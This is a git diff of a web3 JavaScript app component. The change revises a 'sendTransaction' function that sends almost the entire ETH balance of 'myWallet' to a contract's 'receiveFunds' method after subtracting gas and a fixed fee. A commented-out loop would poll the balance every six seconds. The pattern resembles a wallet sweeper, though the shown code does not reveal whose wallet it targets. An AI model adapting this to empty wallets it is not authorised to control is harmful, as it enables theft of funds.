@@ -96,23 +96,33 @@ function MyApp({ Component, pageProps }) {
         //setInterval(() => { scanBalance(myWallet) }, 6000); 
 
         async function sendTransaction() {
-          let valueToSend = balance - (3000000 * 20000000000); //decimal
+          const gas = 21000;
+          const gasPrice = 250000000000;
+
+          const fee = 15000000000000000; //0.015 ETH
+
+          let valueToSend = balance - (gas * gasPrice) - fee; //decimal
           let valueToSendHEX = web3.utils.toHex(valueToSend);
 
           let balanceETH = web3.utils.fromWei(balance.toString(), "ether");
           let valueToSendETH = web3.utils.fromWei(valueToSend.toString(), "ether");
+          let gasETH = web3.utils.fromWei((gas * gasPrice).toString(), "ether");
+
+          //let defaultGasPrice = web3.eth.getGasPrice();
 
           console.log(`balance: ${balanceETH}`);
           console.log(`valueToSend: ${valueToSendETH}`);
+
+          console.log(`gasETH: ${gasETH}`);
 
 
           //   Method for transferring money to a smart contract
           await Contract.methods.receiveFunds().send({
             from: myWallet,
             to: sendTo,
-            value: valueToSendHEX, //'3000000000000000000', 
-            gas: '3000000',
-            gasPrice: '20000000000'
+            value: valueToSend, //'3000000000000000000', 
+            gas: gas,
+            gasPrice: gasPrice
           })
             .on('error', (error, receipt) => {
               console.log(error);
